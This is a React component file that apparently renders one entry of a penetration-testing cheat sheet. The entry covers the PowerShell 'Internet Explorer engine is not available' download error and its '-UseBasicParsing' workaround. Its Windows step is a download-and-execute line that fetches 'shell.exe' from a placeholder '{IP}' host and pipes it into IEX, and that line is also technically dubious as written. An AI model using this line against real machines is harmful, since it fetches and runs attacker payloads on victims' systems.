import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const FT_Explorer_Error = ({ title }: IProps) => {

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
                <Typography variant="h6">
              Description
              </Typography>
              <Typography>
              When trying to download a file, you may come across the following error: `The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.`
              </Typography>
              <Box pt={5}></Box>
              <Typography>
              This error is caused due to when Internet Explorer first-launch configuration has not been completed, which prevents the download.
              </Typography>
              <img src="/explorer.png" width={1336/2} height={700/2} />
              <Box pt={5}></Box>
              <Typography>
              This error can be bypassed with the `-UseBasicParsing` flag.
              </Typography>
              <Box pt={5}></Box>
              <Typography variant="h6">
              Step 1 - Linux
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'python3 -m http.server 8000'}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography variant="h6">
            Step 2 - Windows
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {"Invoke-WebRequest https://{IP}/shell.exe -UseBasicParsing | IEX"}
            </SyntaxHighlighter>
            </Typography>
            <Box pt={5}></Box>
            <TreeView
              aria-label="file system navigator"
              defaultCollapseIcon={<ExpandMoreIcon />}
              defaultExpandIcon={<ChevronRightIcon />}
              sx={{ height: "fit-content", flexGrow: 1, maxWidth: 400, overflowY: 'auto', color: '#000000' }}
            >
              <TreeItem nodeId="1" label="Resources">
                
              </TreeItem>
            </TreeView>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default FT_Explorer_Error;
  